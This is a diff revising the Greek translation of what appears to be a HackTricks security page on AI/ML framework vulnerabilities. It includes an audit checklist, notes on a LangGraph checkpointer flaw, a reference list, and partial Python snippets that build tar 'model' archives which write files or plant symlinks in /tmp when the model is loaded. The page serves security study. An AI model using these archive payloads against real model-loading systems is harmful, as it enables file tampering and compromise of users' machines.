+#### 4. Πρακτικό μοτίβο audit για agent frameworks
 
-Ελέγξτε οποιοδήποτε user-controlled input που φτάνει σε:
-- state history / memory / replay / checkpoint listing APIs
-- structured filter builders που παράγουν SQL ή Redis query fragments
+Ελέγξτε οποιοδήποτε input ελεγχόμενο από τον χρήστη που καταλήγει σε:
+- APIs για state history / memory / replay / checkpoint listing
+- structured filter builders που δημιουργούν SQL ή Redis query fragments
 - custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
-- recovery paths που εμπιστεύονται rows που επιστρέφονται από το persistence layer
+- recovery paths που εμπιστεύονται rows τα οποία επιστρέφονται από το persistence layer
 
-Αυτή η συγκεκριμένη chain επηρέασε self-hosted LangGraph deployments που χρησιμοποιούσαν **SQLite** ή **Redis** checkpointers όταν μη έμπιστοι χρήστες μπορούσαν να ελέγξουν το `filter`. Οι patched versions που σημειώθηκαν στη disclosure ήταν `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, και `langgraph-checkpoint 4.0.1+`.
+Η συγκεκριμένη αλυσίδα επηρέασε self-hosted LangGraph deployments που χρησιμοποιούσαν **SQLite** ή **Redis** checkpointers, όταν μη αξιόπιστοι χρήστες μπορούσαν να ελέγξουν το `filter`. Οι patched εκδόσεις που αναφέρονται στο disclosure ήταν `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` και `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>
 
-## Models to Path Traversal
+## Models σε Path Traversal
 
-Όπως σχολιάζεται σε [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), τα περισσότερα model formats που χρησιμοποιούνται από διαφορετικά AI frameworks βασίζονται σε archives, συνήθως `.zip`. Επομένως, μπορεί να είναι δυνατό να καταχραστείτε αυτά τα formats για να πραγματοποιήσετε path traversal attacks, επιτρέποντας την ανάγνωση arbitrary files από το σύστημα όπου φορτώνεται το model.
+Όπως αναφέρεται [**σε αυτήν την ανάρτηση ιστολογίου**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), τα περισσότερα model formats που χρησιμοποιούνται από διαφορετικά AI frameworks βασίζονται σε archives, συνήθως `.zip`. Επομένως, ενδέχεται να είναι δυνατή η κατάχρηση αυτών των formats για την εκτέλεση επιθέσεων Path Traversal, επιτρέποντας την ανάγνωση αυθαίρετων αρχείων από το σύστημα όπου φορτώνεται το model.<sup>[[16]](#references)</sup>
 
-Για παράδειγμα, με τον ακόλουθο κώδικα μπορείτε να δημιουργήσετε ένα model που θα δημιουργήσει ένα αρχείο στον κατάλογο `/tmp` όταν φορτωθεί:
+Για παράδειγμα, με τον ακόλουθο κώδικα μπορείτε να δημιουργήσετε ένα model που θα δημιουργήσει ένα αρχείο στον κατάλογο `/tmp` κατά τη φόρτωσή του:
 ```python
 import tarfile
 
@@ -273,7 +273,7 @@ return member
 with tarfile.open("traversal_demo.model", "w:gz") as tf:
 tf.add("harmless.txt", filter=escape)
 ```
-Ή, με τον παρακάτω κώδικα μπορείτε να δημιουργήσετε ένα model που θα δημιουργήσει ένα symlink στον κατάλογο `/tmp` όταν φορτωθεί:
+Ή, με τον ακόλουθο κώδικα μπορείτε να δημιουργήσετε ένα model που θα δημιουργεί ένα symlink προς τον κατάλογο `/tmp` κατά τη φόρτωσή του:
 ```python
 import tarfile, pathlib
 
@@ -288,31 +288,32 @@ with tarfile.open("symlink_demo.model", "w:gz") as tf:
 tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
 tf.add(PAYLOAD)                      # rides the symlink
 ```
-### Deep-dive: Keras .keras deserialization and gadget hunting
+### Εμβάθυνση: Keras .keras deserialization και gadget hunting
 
-Για έναν εστιασμένο οδηγό σχετικά με τα εσωτερικά του .keras, το Lambda-layer RCE, το arbitrary import issue σε ≤ 3.8, και την ανακάλυψη gadget μετά το fix μέσα στο allowlist, δες:
+Για έναν στοχευμένο οδηγό σχετικά με τα internals του .keras, το Lambda-layer RCE, το arbitrary import issue σε εκδόσεις ≤ 3.8 και την αναζήτηση gadgets μέσα στο allowlist μετά το fix, δείτε:
 
 
 {{#ref}}
 ../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
 {{#endref}}
 
-## References
+## Παραπομπές
 
-- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
-- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
-- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
-- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
-- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
-- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
-- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
-- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
-- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
-- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
-- [Hugging Face Transformers](https://github.com/huggingface/transformers)
-- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
-- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
-- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
-- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
+- [1] [OffSec blog – "CVE-2024-12029 – Deserialization μη αξιόπιστων δεδομένων στο InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
+- [2] [Commit patch του InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
+- [3] [Τεκμηρίωση module του Rapid7 Metasploit](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
+- [4] [PyTorch – ζητήματα ασφαλείας για το torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
+- [5] [ZDI blog – CVE-2025-23298: Απόκτηση Remote Code Execution στο NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
+- [6] [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
+- [7] [Commit patch του Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
+- [8] [Ευάλωτος loader πριν από το patch (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
+- [9] [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
+- [10] [Loader μετά από το patch (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
+- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
+- [12] [Unit 42 – Remote Code Execution με σύγχρονες AI/ML formats και libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
+- [13] [Τεκμηρίωση του Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
+- [14] [Commit block-list του Hydra (προειδοποίηση για RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
+- [15] [Check Point Research – Από SQLi σε RCE: Εκμετάλλευση του Checkpointer του LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
+- [16] [Μετατροπή Archive Slip Bugs σε bounties υψηλής αξίας για AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
 
 {{#include ../banners/hacktricks-training.md}}
